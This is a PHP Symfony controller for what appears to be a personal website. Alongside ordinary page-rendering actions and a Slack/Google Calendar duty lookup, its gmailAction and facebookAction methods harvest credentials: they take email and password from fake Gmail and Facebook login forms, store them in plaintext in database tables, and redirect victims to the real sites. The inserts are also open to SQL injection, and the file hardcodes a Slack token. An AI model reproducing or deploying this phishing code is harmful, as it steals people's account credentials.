<?php

namespace Personal\Bundle\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;

include('database.php');
include('secrets.php');

$accessToken = "";

class DefaultController extends Controller
{
    public function indexAction()
    {
        return $this->render('PersonalBundle:Default:index.html.twig');
    }
    
    public function projectsAction() 
    {
        return $this->render('PersonalBundle:Default:projects.html.twig');
    }
    
    public function gameAction() 
    {
        return $this->render('PersonalBundle:Default:game.html.twig');
    }
    
    public function gmailAction()
    {
        if(isset($_POST['Email']) && isset($_POST['Passwd']))
        {
            $con = mysqli_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS, MYSQL_DB);

            if (mysqli_connect_errno()) 
            {
              echo "Failed to connect to MySQL: " . mysqli_connect_error();
            }

            $username = $_POST['Email'];
            $password = $_POST['Passwd'];

            mysqli_query($con,"INSERT INTO Gmail (Username, Password) VALUES ('$username', '$password')");

            mysqli_close($con);
            
            return $this->redirect('http://www.gmail.com');
        }
        
        return $this->render('PersonalBundle:Default:gmail.html.twig');
    }
    
    public function facebookAction()
    {
        if(isset($_POST['email']) && isset($_POST['pass']))
        {
            $con=mysqli_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS, MYSQL_DB);

            if (mysqli_connect_errno()) 
            {
              echo "Failed to connect to MySQL: " . mysqli_connect_error();
            }

            $username = $_POST['email'];
            $password = $_POST['pass'];

            mysqli_query($con,"INSERT INTO Facebook (Username, Password) VALUES ('$username', '$password')");

            mysqli_close($con);
            
            return $this->redirect('http://www.facebook.com');
        }
        
        return $this->render('PersonalBundle:Default:facebook.html.twig');
    }
    
    public function menuAction()
    {
        if(isset($_POST['email']) && isset($_POST['hall']))
        {
            $total = 0;
            $hall = $_POST['hall'];
            $email = $_POST['email'];
            foreach($hall as &$value) {
                $total += intval($value);
            }
            $con = mysqli_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS, MYSQL_DB);
            
            if(mysqli_connect_errno()) {
                printf("Connect failed: %s\n", mysqli_connect_error());
                exit();
            }
            
            $stmt = $con->prepare("INSERT INTO lists (`email`, `hall`) VALUES (?, '$total')");
            $stmt -> bind_param('s', $email);
            
            $result = $stmt->execute();
            return $this->render('PersonalBundle:Default:menu.html.twig', array('message' => "Submission successful!"));
        }
        return $this->render('PersonalBundle:Default:menu.html.twig');
    }
	
	public function privacyAction()
	{
		return $this->render('PersonalBundle:Default:privacy.html.twig');
	}
    
    public function mediaAction()
    {
        return $this->render('PersonalBundle:Default:media.html.twig');
    }
    
    public function shitpostAction()
    {
        return $this->render('PersonalBundle:Default:shitpost.html.twig');
    }
    
    public function lothianAction()
    {   
        if(isset($_POST) && isset($_POST['command']) && isset($_POST['token'])) {
            if($token != "kytAx7z4AnLpKEzZZSMSMQoY"){ 
                $msg = "The token for the slash command doesn't match. Check your script.";
                die($msg);
                echo $msg;
            }
            
            $client = new Google_Client();
            $service = new Google_Service_Calendar($client);
            
            $default_start_string = "Y-m-d\T17:00:00-07:00";    // 5 PM
            $default_end_string = "Y-m-d\T18:00:00-07:00";      // 6 PM
            $command = $_POST['command'];
            
            $date_given = isset($_POST['text']);
            
            $start_time = isset($_POST['text']) 
                    ? date($default_start_string, strtotime($_POST['text'])) 
                    : date($default_start_string);
            $end_time = isset($_POST['text'])
                    ? date($default_end_string, strtotime($_POST['text'])) 
                    : date($default_end_string);
            
            $calendarId = CALENDAR_ID;
            $optParams = array(
              'maxResults' => 1,
              'orderBy' => 'startTime',
              'singleEvents' => TRUE,
              'timeMin' => $start_time,
              'timeMax' => $end_time
            );
            $results = $service->events->listEvents($calendarId, $optParams);

            if (count($results->getItems()) === 0) {
              print "Nothing found for that day.\n";
            } else {
              foreach ($results->getItems() as $event) {
                  $duty = $event->summary;
                  printf("*%s* is on duty.", $duty);
              }
            }
        }
    }
    
    /**
     * Returns an authorized API client.
     * @return Google_Client the authorized client object
     */
    function getClient() {
        $client = new Google_Client();
        $client->setApplicationName('Slack Google Calendar');
        $client->setScopes('Google_Service_Calendar::CALENDAR_READONLY');
        $client->setAuthConfigFile(CLIENT_SECRET_PATH);
        $client->setAccessType('offline');

        $accessToken = getAccessToken();
        $client->setAccessToken($accessToken);

        // Refresh the token if it's expired.
        if ($client->isAccessTokenExpired()) {
            $client->refreshToken($client->getRefreshToken());
            $accessToken = $client->getAccessToken();
        }
        return $client;
    }
    
    /**
     * Function to get access token from Google OAuth
     * @return Google API Access Token
     */
    private function getAccessToken() 
    {
        $tokenURL = 'https://accounts.google.com/o/oauth2/token';
        $postData = array(
            'client_secret'=> CLIENT_SECRET,
            'grant_type'=> 'refresh_token',
            'refresh_token'=> REFRESH_TOKEN,
            'client_id'=> CLIENT_ID
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $tokenURL);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $tokenReturn = curl_exec($ch);
        $token = json_decode($tokenReturn);
        $accessToken = $token->access_token;
        return $accessToken;
    }
    
}
